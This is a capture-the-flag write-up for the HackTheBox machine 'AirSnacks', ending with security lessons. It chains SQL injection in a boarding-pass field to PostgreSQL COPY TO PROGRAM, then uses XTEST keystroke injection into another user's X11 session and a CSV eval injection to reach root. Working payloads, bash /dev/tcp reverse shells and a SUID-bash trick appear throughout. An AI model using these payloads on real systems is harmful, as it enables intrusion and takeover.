# AirSnacks (HTB) — Writeup: From SQL Injection to Root

> **Note:** following HTB community convention, flags have been redacted (`<REDACTED>`). Replace them with the values you found on your own instance before publishing, if you want, or keep them redacted.

## Attack chain summary

```
AirSnacks web application
        |
        v
Boarding pass verification endpoint (BCBP)
        |
        v
SQL Injection in the "airline_use" field (conditional section)
        |
        v
pg_execute_server_program privilege (PostgreSQL)
        |
        v
RCE via COPY ... TO PROGRAM -> shell as postgres
        |
        v
X11 session with no access control (xhost open)
        |
        v
XTEST: synthesize Ctrl+Alt+T -> opens dutyfree-kiosk's xterm
        |
        v
Shell as dutyfree-kiosk (pos-ops group)
        |
        v
Write access to /opt/vrs/data/duty-rates.csv (group-writable)
        |
        v
systemd path unit triggers a root service with unsafe eval
        |
        v
Root
```

---

## 1. Reconnaissance

```bash
nnmap -Pn -sV -T4 <TARGET_IP>
```

Open ports:

| Port | STATE | SERVICE | VERSION
|---|---|
22/tcp  open  ssh      OpenSSH 8.9p1 Ubuntu 3ubuntu0.18 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http     nginx 1.18.0 (Ubuntu)
443/tcp open  ssl/http nginx 1.18.0 (Ubuntu)
Add the virtual host:

```bash
echo '<TARGET_IP> airsnacks.htb' | sudo tee -a /etc/hosts
```

The application is a self-checkout store with the flow:

- `/browse` — browse products
- `/cart` — inspect the cart
- `/checkout/boarding-pass` — submit a boarding pass
- `/checkout/boarding-pass/verify` — backend endpoint called via JS

---

## 1.1 Information gathering with `curl`

Before going to the browser/Burp, it's worth mapping the application with just `curl` — fast, scriptable, and easy to repeat.

### Headers and server technology

```bash
curl -sk -I https://airsnacks.htb/
```

**Result:**

HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Tue, 10 Nov 2026 19:26:08 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 1470
Connection: keep-alive
Vary: Cookie
Set-Cookie: session=; Expires=Thu, 01 Jan 1970 00:00:00 GMT; Max-Age=0; HttpOnly; Path=/



Useful for identifying the server (`nginx`), session cookies set (`Set-Cookie`), caching policy, and security headers (or the lack of them — `Content-Security-Policy`, `X-Frame-Options`, etc.).

### Following redirects and seeing the full chain

```bash
curl -sk -L -D - -o /dev/null https://airsnacks.htb/
```

`-D -` prints the headers of each hop; `-o /dev/null` discards the body (we only want to see the redirect path, e.g. HTTP→HTTPS).

### Downloading the HTML/JS for offline analysis

```bash
curl -sk https://airsnacks.htb/ -o index.html
curl -sk https://airsnacks.htb/static/app.js -o app.js
```
#### Offline analysis of app.js

```bash
grep -oE '"/[a-zA-Z0-9/_-]+"' app.js | sort -u
```
**Result:**

- "/cart/add"
- "/checkout/boarding-pass/verify"

This is how the `postJSON("/checkout/boarding-pass/verify", ...)` call in the frontend was confirmed — `grep` extracts every path quoted in the JS, a quick way to map endpoints without reading the whole file by hand.

### Enumerating common routes/exposed files

```bash
for path in robots.txt sitemap.xml .env config.json api/health health; do
  echo "== /$path =="
  curl -sk -o /dev/null -w "%{http_code}\n" "https://airsnacks.htb/$path"
done
```

### Creating/managing the session (cookie jar) from the command line

```bash
JAR=/tmp/airsnacks-cookies.txt

# first visit, to get a session cookie
curl -sk -c "$JAR" -b "$JAR" https://airsnacks.htb/ -o /dev/null

# add an item to the cart (endpoint discovered in app.js)
curl -sk -c "$JAR" -b "$JAR" \
  -H 'Content-Type: application/json' \
  -d '{"sku":"SNK-CRN"}' \
  https://airsnacks.htb/cart/add

# confirm the cart's contents
curl -sk -c "$JAR" -b "$JAR" https://airsnacks.htb/cart
```

Using `-c "$JAR" -b "$JAR"` on the same file makes `curl` automatically read and write cookies on every request, keeping the session consistent across calls — without having to manually copy the `session=...` value from the browser for every test.

### Testing the target endpoint with a minimal body (checking the error message)

```bash
curl -sk -X POST https://airsnacks.htb/checkout/boarding-pass/verify \
  -c "$JAR" -b "$JAR" \
  -H 'Content-Type: application/json' \
  -d '{"raw":""}'
```

**Result:**

```json
{"detail":"expected 'M' at offset 0","error":"BCBP_ERR_FORMAT_CODE","item":1}
```

This error message confirmed the expected format (BCBP) and gave the first lead for building a valid payload.

### Measuring response time (useful later for blind SQLi)

```bash
curl -sk -o /dev/null -w 'time_total: %{time_total}s\n' \
  -X POST https://airsnacks.htb/checkout/boarding-pass/verify \
  -c "$JAR" -b "$JAR" \
  -H 'Content-Type: application/json' \
  -d '{"raw":"anything-at-all"}'
```
**Result:**

time_total: 0.242163s

This pattern (`-w 'time_total: %{time_total}s\n'`) was reused later on to confirm the time-based injection (`pg_sleep`).

---

## 2. Discovering the vulnerable endpoint

The frontend JS (`/static/app.js`) called:

```js
postJSON("/checkout/boarding-pass/verify", { raw: "" });
```

An empty call returned:

```json
{"detail":"expected 'M' at offset 0","error":"BCBP_ERR_FORMAT_CODE","item":1}
```

This confirmed that the backend expects a valid **BCBP (Bar Coded Boarding Pass)** — a positional (non-delimited) format used to encode boarding passes into a barcode.

---

## 3. Building a valid BCBP

The format has a **mandatory** (fixed) part and a **conditional** section (variable length, indicated by a 2-digit hex field).

Structure of the mandatory part (58 bytes):

| Field | Offset | Length |
|---|---|---|
| Format code | 0 | 1 |
| Number of legs | 1 | 1 |
| Passenger name | 2 | 20 |
| Electronic ticket indicator | 22 | 1 |
| PNR | 23 | 7 |
| Origin airport | 30 | 3 |
| Destination airport | 33 | 3 |
| Operating carrier | 36 | 3 |
| Flight number | 39 | 5 |
| Date (Julian day) | 44 | 3 |
| Compartment | 47 | 1 |
| Seat | 48 | 4 |
| Check-in sequence | 52 | 5 |
| Passenger status | 57 | 1 |

Next comes the **field size** (2 hex digits) and the **conditional section**, which in turn holds two variable-length blocks (`unique` and `repeated`) followed by a final free-text field called **"For Airline Individual Use"** — this is the field that turned out to be the injection point.

Valid BCBP generator script (Python):

```python
#!/usr/bin/env python3
import json, time, urllib.request, ssl

URL = "https://airsnacks.htb/checkout/boarding-pass/verify"
COOKIE = "session=eyJjYXJ0Ijp7IkJFUi1TQlctNiI6MX0sImNhcnRfaWQiOiJjXzUxNjI3YzEyMGMifQ.avIoSA.kRZwUVwMq2HZ0BEuwPoEcfe5cL4"   # <<< UPDATE THIS

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

def make_bcbp(name="DESMARAIS/LUC", frm="LHR", to="JFK", carrier="BA",
              pnr="ABC123", flight="0117", julian_date="325",
              compartment="Y", seat="024A", seq="0101", status="0",
              version="5",
              pax_desc="0", checkin_src="W", bp_src="W",
              issue_julian="6325", doc_type="B", issuer_carrier="BA",
              bag_tag="0000000000000",
              airline_numeric="125", doc_serial="0000000000",
              selectee="0", intl_doc_verif="0",
              marketing_carrier="BA", ff_carrier="BA", ff_number="0000000000000000",
              id_ad="0", baggage_allow="  0",
              fast_track="0",
              airline_use=""):
    leg = "%-7s%-3s%-3s%-3s%-5s%03d%-1s%-4s%-5s%-1s" % (
        pnr[:7], frm[:3], to[:3], carrier[:3].ljust(3),
        flight[:5], int(julian_date), compartment[:1],
        seat[:4], seq[:5], status[:1],
    )
    mandatory = "M1" + name[:20].ljust(20) + "E" + leg   # 58 chars

    unique_block = (
        pax_desc[:1] + checkin_src[:1] + bp_src[:1]
        + issue_julian[:4].rjust(4, "0")
        + doc_type[:1] + issuer_carrier[:3].ljust(3)
        + bag_tag[:13].ljust(13)
    )
    unique_size = "%02X" % len(unique_block)

    repeated_block = (
        airline_numeric[:3].rjust(3, "0")
        + doc_serial[:10].ljust(10)
        + selectee[:1] + intl_doc_verif[:1]
        + marketing_carrier[:3].ljust(3)
        + ff_carrier[:3].ljust(3) + ff_number[:16].ljust(16)
        + id_ad[:1] + baggage_allow[:3].ljust(3)
    )
    repeated_size = "%02X" % len(repeated_block)

    cond_body = (
        ">" + version
        + unique_size + unique_block
        + repeated_size + repeated_block
        + fast_track[:1]
        + airline_use
    )

    outer_size = "%02X" % len(cond_body)
    return mandatory + outer_size + cond_body

def test(label, **kwargs):
    raw = make_bcbp(**kwargs)
    data = json.dumps({"raw": raw}).encode()
    req = urllib.request.Request(
        URL, data=data, method="POST",
        headers={"Content-Type": "application/json", "Cookie": COOKIE}
    )
    t0 = time.time()
    try:
        with urllib.request.urlopen(req, context=ctx, timeout=20) as resp:
            body = resp.read().decode(errors="replace")
            elapsed = time.time() - t0
            print(f"[{label:20s}] status={resp.status} time={elapsed:.2f}s body={body[:200]}")
    except urllib.error.HTTPError as e:
        body = e.read().decode(errors="replace")
        elapsed = time.time() - t0
        print(f"[{label:20s}] status={e.code} time={elapsed:.2f}s body={body[:200]}")

test("pg_sleep-fixed", airline_use="'); SELECT pg_sleep(5)--")

```

A "baseline" call (no injection) returned `200 OK` with an eligibility token — confirming that the generated BCBP was valid.

---
To automate sending requests and timing responses, I combined the generator with a helper function `test()` and a block of calls. This is the **complete script** (`test.py`) used in every step that follows — sections 4 and 5 only add/activate lines inside the final block:



## 4. Identifying the SQL Injection

By placing a single quote in the `airline_use` field:

```python
test("single-quote", airline_use="'")
```

The server responded `500` with a PostgreSQL error:

```
unterminated quoted string at or near "'0'')"
LINE 1: ..., '325', 'LHR', 'JFK', 'BA', '0000000000000000', 133, '0'')
```

This confirmed two crucial facts:

1. The value of `airline_use` is interpolated directly into a SQL query, with no parameterization.
2. The query structure is something like:
   ```sql
   INSERT INTO bp_scan_audit (...) VALUES ('free-kioskN', now(), ..., '<airline_use>')
   ```

### Confirming stacked queries (blind, with `pg_sleep`)

```python
test("pg_sleep-fixed", airline_use="'); SELECT pg_sleep(5)--")
```

Result: `status=200 time=5.23s` — the response took ~5 seconds, confirming execution of the stacked query even with an HTTP 200 (the audit log is written in a "fire and forget" fashion, without blocking the response to the client).

---

## 5. RCE via `COPY ... TO PROGRAM`

The database account used by the application (`airsnacks_app`) is not a superuser, but it has the `pg_execute_server_program` role, which in PostgreSQL allows executing operating-system commands through `COPY ... TO PROGRAM`.

### Generating the reverse shell payload

```bash
echo -n 'bash -c "bash -i >& /dev/tcp/<YOUR_VPN_IP>/<PORT>/0>&1"' | base64 -w0
```

> Explicitly use `bash -c "..."` because `COPY TO PROGRAM` executes via `/bin/sh`, which normally doesn't support `/dev/tcp`.

### Injection payload

```python
test("reverse-shell", airline_use="'); COPY (SELECT '') TO PROGRAM 'echo <BASE64> | base64 -d | bash'--")
```

### Listener

```bash
nc -lvnp <PORT>
```

Result: shell received as the `postgres` user on Ubuntu 22.04.

---

## 6. Pivoting via the X11 session (postgres → dutyfree-kiosk)

### Reconnaissance

```bash
ps aux | grep -i x
ls -la /tmp/.X11-unix/
```

Findings:

- Active X session on `:0`, launched by the `dutyfree-kiosk` user (Openbox + Firefox in kiosk mode).
- The `/tmp/.X11-unix/X0` socket had `srwxrwxrwt` permissions — **any local process could connect to the display**, with no need for `.Xauthority`.

Confirmation:

```bash
DISPLAY=:0 xdpyinfo 2>&1 | head -20
```

It worked without authentication — isolation failure confirmed.

### Synthesizing `Ctrl+Alt+T` via XTEST

The Openbox configuration (`/etc/xdg/openbox/rc.xml`) had this shortcut bound to opening an `xterm`.

```python
cat > /tmp/xtest_hotkey.py << 'PYEOF'
#!/usr/bin/env python3
import time
from Xlib import X, display
from Xlib.ext import xtest
from Xlib.XK import string_to_keysym

d = display.Display(":0")

def kc(name):
    return d.keysym_to_keycode(string_to_keysym(name))

ctrl = kc("Control_L")
alt  = kc("Alt_L")
t    = kc("t")

xtest.fake_input(d, X.KeyPress, ctrl); d.sync()
xtest.fake_input(d, X.KeyPress, alt);  d.sync()
time.sleep(0.1)
xtest.fake_input(d, X.KeyPress, t);   d.sync()
xtest.fake_input(d, X.KeyRelease, t); d.sync()
time.sleep(0.1)
xtest.fake_input(d, X.KeyRelease, alt);  d.sync()
xtest.fake_input(d, X.KeyRelease, ctrl); d.sync()
print("Hotkey sent.")
PYEOF
```

```bash
DISPLAY=:0 python3 xtest_hotkey.py
ps aux | grep -i xterm
# dutyfre+  xxxx  ... xterm   <- confirms it opened
```

### Typing commands inside the xterm

Script that synthesizes keys character by character (including `Shift` for uppercase/symbols):

```python
cat > /tmp/xtest_type.py << 'PYEOF'
#!/usr/bin/env python3
import sys, time
from Xlib import X, display
from Xlib.ext import xtest
from Xlib.XK import string_to_keysym

d = display.Display(":0")

SHIFT_MAP = {
    '!': '1', '@': '2', '#': '3', '$': '4', '%': '5',
    '^': '6', '&': '7', '*': '8', '(': '9', ')': '0',
    '_': 'minus', '+': 'equal', '{': 'bracketleft', '}': 'bracketright',
    '|': 'backslash', ':': 'semicolon', '"': 'apostrophe',
    '<': 'comma', '>': 'period', '?': 'slash', '~': 'grave',
}
NAME_MAP = {
    ' ': 'space', '\n': 'Return', '/': 'slash', '-': 'minus',
    '=': 'equal', '.': 'period', ',': 'comma', ';': 'semicolon',
    "'": 'apostrophe',
}

def send_key(keysym_name, shift=False):
    keysym = string_to_keysym(keysym_name)
    keycode = d.keysym_to_keycode(keysym)
    if keycode == 0:
        return
    if shift:
        sk = d.keysym_to_keycode(string_to_keysym("Shift_L"))
        xtest.fake_input(d, X.KeyPress, sk)
    xtest.fake_input(d, X.KeyPress, keycode)
    xtest.fake_input(d, X.KeyRelease, keycode)
    if shift:
        xtest.fake_input(d, X.KeyRelease, sk)
    d.sync()

def type_string(s):
    for ch in s:
        if ch in SHIFT_MAP:
            send_key(SHIFT_MAP[ch], shift=True)
        elif ch.isupper():
            send_key(ch.lower(), shift=True)
        elif ch in NAME_MAP:
            send_key(NAME_MAP[ch])
        else:
            send_key(ch)
        time.sleep(0.02)

if __name__ == "__main__":
    text = sys.argv[1]
    if not text.endswith('\n'):
        text += '\n'
    time.sleep(0.5)
    type_string(text)
PYEOF
```

Rather than just writing to a file, the decisive step was typing a **reverse shell** directly inside the already-open xterm (which runs as `dutyfree-kiosk`):

```bash
DISPLAY=:0 python3 /tmp/xtest_type.py "bash -c 'bash -i >& /dev/tcp/<ip>/<port> 0>&1'"
```

With a second listener waiting:

```bash
nc -lvnp <PORT_2>
```

Result: interactive shell as `dutyfree-kiosk`.

```bash
id
# uid=1000(dutyfree-kiosk) gid=1000(dutyfree-kiosk) groups=1000(dutyfree-kiosk),1001(pos-ops)

cat ~/user.txt
# <REDACTED> (user flag)
```

---

## 7. Privilege escalation: writable CSV + systemd path unit + unsafe `eval`

The `dutyfree-kiosk` user belongs to the `pos-ops` group, which has write permission on:

```
/opt/vrs/data/duty-rates.csv
```

This file is watched by a **systemd path unit** (`vrs-duty-apply.path`), which, upon detecting changes, triggers a service (`vrs-duty-apply.service`) run as **root**. That service runs a script (`/opt/vrs/bin/apply-duty-rates.sh`) which reads the CSV line by line and, for each tax class, executes:

```bash
eval "${tax_class}=${duty_pct}"
```

The script validates that the last two fields (`duty_pct`, `vat_pct`) are numeric — **but does not validate the first field** (`tax_class`), which is interpreted as shell syntax inside the `eval`.

### Exploitation

```bash
# back up the original file (good practice in authorized CTF/pentest work)
cp /opt/vrs/data/duty-rates.csv /tmp/duty-rates.bak

# inject a malicious line at the top of the file
printf '%s\n' '$(cp /bin/bash /tmp/rootbash; chmod 6755 /tmp/rootbash),45,20' \
  | cat - /tmp/duty-rates.bak > /opt/vrs/data/duty-rates.csv

# wait for the systemd path unit to trigger the service
sleep 6

# confirm the SUID binary created by the root service
ls -la /tmp/rootbash
# -rwsr-sr-x 1 root root ... /tmp/rootbash

# shell with root privileges
/tmp/rootbash -p -c 'cat /root/root.txt'
# <REDACTED> (root flag)
```

## 8. Security lessons

1. **Never interpolate untrusted data into SQL.** Even "internal use" fields like `airline_use` must go through parameterization (`cursor.execute(sql, params)`), never `%`-formatting or f-strings.
2. **Principle of least privilege in the database.** The `pg_execute_server_program` role should never be associated with a web application account.
3. **Isolation of graphical sessions.** An X11 display should never accept connections without authentication (`xhost`/`.Xauthority` misconfigured), and especially not be reachable by service accounts such as `postgres`.
4. **Never use `eval` on external data**, even if it looks partially validated — validating 2 out of 3 fields doesn't make the third one safe.
5. **Permissions on files consumed by privileged services** must be strictly controlled; a CSV writable by a non-root group should never be able to influence a root service.
6. **Verbose error messages** (SQL stack traces, DB function names) help attackers confirm and refine injections — they should be replaced with generic errors in production.

---

## Tools and techniques used

- `nmap` — port reconnaissance
- Python scripts (`urllib`, no external dependencies) for fuzzing and exploiting the BCBP endpoint
- PostgreSQL `COPY ... TO PROGRAM` for RCE via SQLi
- `python-xlib` + the `XTEST` extension to synthesize keyboard events on another user's X11 session
- Abuse of systemd path units + unsafe `eval` in a shell script for escalation to root

---

*Writeup carried out in an authorized lab environment (HackTheBox). Flags redacted per community convention.*
